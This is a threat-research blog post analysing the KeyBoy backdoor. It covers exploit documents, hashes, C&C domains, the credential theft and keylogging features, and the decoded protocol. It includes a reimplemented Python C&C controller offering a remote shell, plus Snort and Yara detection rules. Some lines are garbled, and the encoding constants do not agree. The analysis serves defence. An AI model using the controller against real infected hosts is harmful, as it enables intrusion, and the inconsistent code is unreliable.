In this blog post we'll analyze two specific incidents apparently**\n**targeting victims in Vietnam and in India and we'll describe the capabilities of the custom backdoor being used that for convenience (and to**\nour knowledge, for a lack of an existing name) we call KeyBoy, due to a string present in one of the samples.\n\nWe'll describe how the attackers operate these backdoors, provide some scripts useful to further investigate the campaign as well as meanings\nto detect infections or scout for additional samples.\n\n## Exploits and Payloads\n\nWe encountered the first document exploit called \"THAM luan- GD- NCKH2.doc\" a few days ago, which appears to be leveraging some\nvulnerabilities patched with MS12-060. When opened with a vulnerable version of Microsoft Word, the exploit will initiate the infection routine\nand display the legitimate document that follows:\n\nThis document, written in Vietnamese, appears to be reviewing and discussing best practices for teaching and researching scientific topics. We\nhave no knowledge on the identity of the target, but we can assume he might part of the Vietnamese academic community. The document is\nnamed to Nguyen Anh Tuan, which is presented as author of this crafted text.\n\nFollowing are the hashes of the exploit file:\n\n**THAM luan- GD- NCKH2.doc Hash Value**\n\nMD5161c840748df9b49fda878394398425aSHA1e3cc84a4dc66e43453a039c3c983fcef92eafa7dSHA256\n\n5ba8c42807bee050aa474fe3c876936d196c65dca9895ccd2e317133188c905e\n\nSHA51230bb6c3bcb797b8ebe5ab4bef59173ba358ea6713ea26cbc0147c37b99a54eca62f09475299a44c3\n98679f84fa87dc6dff084a185543945f123fb34236fa825b\n\nWhen executed the exploit initially creates and launches a dropper at location %Temp%\\svchost.exe with the following hashes:\n\n**svchost.exe Hash Value**\n\nMD51f4d22e5131a66aa24f44eb0d4f1b54dSHA12c8a144331ec124755413f31a83e21015c74f2ecSHA2561c076413cca929b7004863f1a3992afda\n\n23941ed22acded5ecfa3e9acd88f2c66a6619fa6793231ea\n\nThis payload then creates a DLL file in system32 called CREDRIVER.dll, which is in fact the actual backdoor:\n\n\n-----\n\n**CREDRIVER.dll Hash Value**\n\nMD52df60de8cb6b9fe7db1ea10581cfcda4SHA1fb8057595f2bb53331620c717775751df781c151SHA256ba4863d8a22864fa50a32aa85bc80837\n\n698de80f6ee4e361234c96a0454c490b4faa69869191ed81\n\nWe also identified another document exploiting CVE-2012-0158, but this time apparently targeting some Indian individuals. The content of the\ndocument is the following:\n\nThis time the bait appears to be related to the state of telecommunication infrastructure in the district of Calcutta in India, discussing the\ncoverage of GSM networks and availability and stability of broadband connections.\nAlso for this intrusion we can't know the identity of the target, but our hypothesis is either someone in the telecommunications industry or a\nrepresentative of the local government. In this case this crafted document pretends to be authored by someone called Amir Kumar Gupta.\n\n**iafbsnl.doc Hash Value**\n\nMD5dff54d302900e323c8988c725bbe2299SHA1c5c0bae48c326006b9dcc99855646d3be0b474c1SHA2561595ea659a87677c59a195a3aeec9e3\n\n8b7d320c08ee7ba96322c127329c6f94bfb288eeb9c6a0c5\n\n**CREDRIVER.dll Hash Value**\n\nMD52b8c79678fa970ca4e229121e3de206fSHA15e4b7268606d6c98d00874431d39c34971149200SHA256c22792dbf9a0279b36fa22f775a92ddf\n\nb18acb276ac5f8c777d4565bbba8e615212a2aedbc54f95e\n\nAll backdoors appear to be compiled on April 1st 2013, suggesting that the attacks are reasonably recent.\n\n## Analysis of the Backdoor\n\nFor the sake of this analysis we'll take the Vietnamese backdoor as an example; the one found in the Indian attack operates in the exact same\nway.\n\nAs mentioned, when the exploit is opened a dropper is created and launched, which then takes care of creating a Windows service called\n**MdAdum, which is then visible in the registry as follows:**\n\n\n-----\n\nThe dropper then launches the service with the DLL located at C:\\WINDOWS\\system32\\CREDRIVER.dll and deletes itself. Resilience on the\nsystem is guaranteed by the use of such service which will be executed at every start up.\n\nNote that the Indian attack does not make use of this middle-stage dropper, but directly installs and launches the Windows service instead.\n\nThis backdoor has several features including:\n\n1. Steal credentials from Internet Explorer\n2. Steal credentials from Mozilla Firefox\n3. Install a keylogger for intercepting credentials on Google Chrome\n4. Operate in an interactive mode to allow the attacker to perform additional investigation on the compromised system and exfiltrate data.\n\nFollowing you can see the portion of the code where the backdoor, after having verified which version of Mozilla Firefox is installed on the\nsystem, decides which technique to use to recover the credentials from the browser's local storage.\n\n\n-----\n\no de e s o s o e o, c ede t a s e e sto ed se e a t t es _% pp ata%\\_ _o_ _a\\_ _e o,_ e ost ece t o es t ey a e\nstored in a SQLite database. In the following snipped you see the SQL statement to extract the data:\n\nJust in the same way, the backdoor attempts to collect password autocomplete from Internet Explorer:\n\nThe backdoor also creates a separate thread that installs a Windows hook procedure on message WH_KEYBOARD_LL, through which it can\nintercept keystrokes. We believe this is mainly used to intercept credentials from other browsers, specifically Google Chrome:\n\n## Analysis of the Protocol\n\nThe backdoor tries to contact the following domains until it gets a response from an active one:\n\nsilence.phdns01.com\ncpnet.phmail.us\nimlang.phmail.org\n\nThe Indian backdoor tries to contact the following domains instead:\n\ncresy.zyns.com\npreter.epac.to\nbackto.ddns.name\n\nIn the first set of domains they are either registered with Whois proxy services or with fake identities. In the second set they are making use of\na dynamic DNS service by ChangeIP.com.\n\n\n-----\n\no o g a e t aces co ected o pass e S data e e a t to t e osts o ed t ese attac s\n\n**DomainFirst SeenLast SeenIPsASNsilence.phdns01.comMay 21st 2013May 25th 2013199.193.66.51 (TTL: 1800)6939 - HURRICANE -**\nHurricane Electric, Inc.cpnet.phmail.usMay 10th 2013May 24th 2013199.193.66.51 (TTL: 1800)6939 - HURRICANE - Hurricane Electric,\nInc.imlang.phmail.orgMay 22nd 2013May 23rd 2013199.193.66.51 (TTL: 1800)6939 - HURRICANE - Hurricane Electric,\nInc.vtt.phdns01.comMarch 9th 2013April 19th 2013199.193.66.51 (TTL: 1800)6939 - HURRICANE - Hurricane Electric, Inc.preter.epac.toMay\n31st 2013May 31st 20131.235.10.28 (TTL: 30)9318 - HANARO-AS Hanaro Telecom Inc.preter.epac.toMay 18th 2013May 28th\n2013113.160.44.154 (TTL: 30)45899 - VNPT-AS-VN VNPT Corp\n\nThis is an initial request that the backdoor would send out on port 443 to an active C&C:\n\n00000000 c4 4c 87 3f 11 1e c4 1a 2c a9 12 1a 19 61 82 de |.L.?....,....a..|\n\n00000010 19 26 f8 de bd 26 de 19 b0 19 1a 95 a1 dd 2b 6d |.&...&........ m|\n\n00000020 c2 1a 82 b0 19 eb 47 b0 26 47 b0 26 20 82 eb ca |......G.&G.& ...|\n\n00000030 bd 26 ca 82 54 1a d0 c2 87 38 a1 20 82 b0 19 eb |.&..T....8. ....|\n\n00000040 b0 54 b0 19 1a 00                 |.T....|\n\nAt the time of the analysis all the C&C servers were not responding, we started reverse engineering the communication protocol and noticed\nthat it simply used a multiply with 0x69 to encode the traffic sent to the controllers. You can easily decode the content of the payload with the\nfollowing Python snippet:\n```\ndef decode(x):\nreturn\n''.join([chr((ord(i)*0xd9)&0xff) for i in x])\n\n```\nThe previous packet decodes to the following:\n\n$login$\n\nLAB\n\n192.168.56.101\n\nMyUser\n\n2013/06/06 23:56:24\n\nProxy 20130401\n\nWhile reverse engineering the backdoor we noticed that the malware expects the following messages from the C&C server it contacts:\n\nSysinfo\nFileManager\nDownload\nUploadFileOk\nShell\n\nIntrigued by its capabilities, we started reconstructing the communication protocol and practically building a tool that would operate\n**just like the original controller used by the attackers. The following is a preliminary Python script that implements the protocol used by the**\nmalware and allows you to interact with it:\n\n\n-----\n\n```\n# Rapid7 Labs\n# 2013-06-06 # # (c) 2013 Rapid7\n# http://www.rapid7.com import sys import socket import select def decode(x):\nreturn ''.join([chr((ord(i)*0xd9)&0xff) for i in x]) def encode(x):\nreturn ''.join([chr((ord(i)*0x93)&0xff) for i in x]) def main():\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind((\"0.0.0.0\", 443))\ns.listen(1)\nprint \"[*] C&C Running on 0.0.0.0:443\"\nwhile True:\ns2, ca = s.accept()\nprint \"[ ] New client connected:\", ca\nwhile True:\ndec = \"\"\nrlist, wlist, xlist = select.select([s2,],[],[], 10)\nwhile rlist:\ndata = s2.recv(2048)\nif not data: break\ndec = decode(data)\nprint dec\nrlist, wlist, xlist = select.select([s2,],[],[], 2)\nif dec.startswith(\"$login$\"):\nprint \"[ ] Authenticating on the bot\"\ns2.send(encode(\"login_OK\") \"\\x00\")\ns2.send(encode(\"Refresh\") \"\\x00\")\nelif dec.startswith(\"OnLine\"):\ns2.send(encode(\"test\") \"\\x00\") # Replace \"test\" with \"dns.com\" in case of the Indian sample.\nelse:\ncmd = raw_input(\"shell> \").strip()\ns2.send(encode(cmd) \"\\x00\")\ns2.close()\ns.close()\nreturn 0 if __name__ == \"__main__\":\ntry: sys.exit(main())\nexcept KeyboardInterrupt: pass\n\n```\nWe then launched this script and redirected the traffic coming from a system infected with KeyBoy and took control of it .\n\nHere you can see the bot beaconing in and requiring for authentication (funny enough the password is \"test\", while the Indian sample uses\n\"dns.com\"):\n\n[*] C&C Running on 0.0.0.0:443\n\n[ ] New client connected: ('192.168.56.110', 1443)\n\n$login$\n\nLAB\n\n192.168.56.110\n\nMyUser\n\n2013/06/07 02:18:35\n\nProxy 20130401\n\n[ ] Authenticating on the bot\n\nOnLine\n\nPw_OK\n\nWhen the authentication is confirmed, we are prompted with a shell through which we can interact in real-time with the bot. The messages we\npreviously identified represent the actual commands that can be sent to the bot:\n\n**Sysinfo: returns detailed information on the computer (pretty much the output of systeminfo); the bot will respond with a message with**\nthe header $sysinfo$.\n**FileManager: interact with all the disks available on the victim system; the bot will respond with a message with the header**\n**$fileManager$.**\n**Download: download a file from the compromised system; the bot will respond with a message with the header $fileDownload$.**\n**UploadFileOk: upload a file to the compromised system; the bot will respond with a message with the header $fileUpload$.**\n\nMost interestingly the command Shell spawns a Windows command shell that we can control remotely:\n\n\n-----\n\ns e S e\n\n$shell$\n\nMicrosoft Windows XP [Version 5.1.2600]\n\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32>\n\nshell> tasklist\n\n$shell$\n\ntasklist\n\n$shell$\n\nImage Name          PID Session Name   Session#  Mem Usage\n\n========================= ====== ================ ======== ============\n\nSystem Idle Process      0 Console         0     28 K\n\nSystem             4 Console         0    236 K\n\nsmss.exe           368 Console         0    388 K\n\ncsrss.exe          584 Console         0   3,740 K\n\nwinlogon.exe         608 Console         0   4,312 K\n\nservices.exe         652 Console         0   3,368 K\n\nlsass.exe          664 Console         0   6,152 K\n\nVBoxService.exe       820 Console         0   3,092 K\n\nsvchost.exe         864 Console         0   4,696 K\n\nsvchost.exe         952 Console         0   4,252 K\n\nsvchost.exe         1044 Console         0   20,424 K\n\nsvchost.exe         1100 Console         0   3,584 K\n\nsvchost.exe         1160 Console         0   4,268 K\n\nspoolsv.exe         1428 Console         0   4,996 K\n\nexplorer.exe        1656 Console         0   29,944 K\n\nVBoxTray.exe        1820 Console         0   3,620 K\n\nGrooveMonitor.exe      1868 Console         0   4,340 K\n\nctfmon.exe         1888 Console         0   3,148 K\n\njqs.exe           2040 Console         0   1,396 K\n\nvmware-usbarbitrator.exe   248 Console         0   3,180 K\n\nalg.exe           1380 Console         0   3,440 K\n\nwscntfy.exe         1692 Console         0   1,804 K\n\nwuauclt.exe         1116 Console         0   6,568 K\n\nsvchost.exe         796 Console         0   4,088 K\n\ncmd.exe           480 Console         0   2,624 K\n\ntasklist.exe         724 Console         0   4,068 K\n\n\n-----\n\np se e e 56 Co so e 0 5,5\n\nC:\\WINDOWS\\system32>\n\nWhile the interaction with the bots could also be scripted, it might be plausible that the operators of these intrusions might be interacting with\ntheir targets exclusively manually to collect different data depending on each individual they infected and the goals they had set for the attack.\n\n## Detecting Infections\n\nWhile these are clearly not widespread attacks and, as in any other targeted attack case, we should not create alarmism for threats that are\nlikely irrelevant for the majority of organizations, we want to share a few indicators that might help identify infections or assist in further\nresearch by whoever is interested in this campaign.\n\nFirstly, thanks to the fixed patterns used by the malware in the authentication procedure, we can detect outbound traffic from infected hosts\nwith the following simple Snort rule:\n\nalert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"KeyBoy Backdoor Login\"; flow:to_server; content:\"|c4 4c 87 3f 11 1e c4 1a|\";\ndepth:8; sid:1000001; rev:1; classtype:trojan-activity; reference:url,community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar\ngeted-attacks-against-vietnam-and-india)\n\nThe simplest way to identify an infection on a given Windows system, is just to look for the existence of the file\n**C:\\WINDOWS\\system32\\CREDRIVER.dll or of a service called MdAdum.**\n\nWe also created a couple of Yara rules that you can use to scan your systems your collection of malware samples to identify copies of\nKeyBoy:\n```\nrule KeyBoy_Dropper\n{\nmeta:\nauthor = \"Rapid7 Labs\"\nreference = \"/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india\"\nstrings:\n$1 = \"I am Admin\"\n$2 = \"I am User\"\n$3 = \"Run install success!\"\n$4 = \"Service install success!\"\n$5 = \"Something Error!\"\n$6 = \"Not Configed, Exiting\"\ncondition:\nall of them\n}\nrule KeyBoy_Backdoor\n{\nmeta:\nauthor = \"Rapid7 Labs\"\nreference = \"/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india\"\nstrings:\n$1 = \"$login$\"\n$2 = \"$sysinfo$\"\n$3 = \"$shell$\"\n$4 = \"$fileManager$\"\n$5 = \"$fileDownload$\"\n$6 = \"$fileUpload$\"\ncondition:\nall of them\n}\n\n## Conclusions\n\n```\nNot a day passes by without hearing of someone hit by a targeted attack. Recently the growth of amount and scale of targeted attacks has\ncome to the point were they are starting to look more like opportunistic carpet bombings rather than ninja strikes. It's common to observe\nattacks pulled off successfully without any particular sophistication in place, including the incidents described in this post.\n\nIt's also getting quite difficult to attribute the attacks to any state-sponsored unit, both because there's a generic lack of strong evidence in such\nincidents (which is why we refrained from making any statement on the origin of these intrusions) but frankly also because almost anybody\n**could operate such campaigns and be reasonably successful. The only differentiation between actors at this point exclusively relies on**\n**identifying the motivations and the context.**\n\nBeware though, just because these attacks are conceptually targeted, it doesn't necessarily mean that they should have a higher priority than\nany other threat on your security program. Our suggestion remains the same: identify your core assets, recognize the most impactful threats to\nsuch assets and inform and protect yourself accordingly.\n\n[This research was brought to you by Claudio Guarnieri and](http://twitter.com/botherder) [Mark Schloesser from Rapid7 Labs.](http://twitter.com/repmovsb)\n\n\n-----",
